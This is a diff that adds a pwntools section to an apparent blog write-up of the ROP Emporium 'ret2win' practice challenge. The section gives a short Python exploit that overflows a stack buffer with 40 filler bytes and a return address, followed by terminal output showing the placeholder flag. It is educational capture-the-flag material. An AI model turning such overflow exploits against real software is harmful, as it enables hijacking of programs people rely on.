@@ -101,3 +101,40 @@ You there madam, may I have your input please? And don't worry about null bytes,
 
 > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
 {% endhighlight %}
+
+
+**Playing with pwntools**
+
+{% highlight python %}
+from pwn import *
+
+def main():
+    p = process("./ret2win")
+    ret2win_address = 0x400811
+    payload = "A"*40 + p64(ret2win_address) + "C"*100
+
+    print p.recvuntil('>')
+
+    p.send(payload)
+    print "%s" % p.recvline()
+
+if __name__ == "__main__":
+    main()
+
+{% endhighlight %}
+
+{% highlight python %}
+root@kali:~/ROPEmporium/ret2win# python pwntool.py 
+[+] Starting local process './ret2win': pid 5352
+ret2win by ROP Emporium
+64bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+>
+ Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
+
+[*] Stopped process './ret2win' (pid 5352)
+{% endhighlight %}
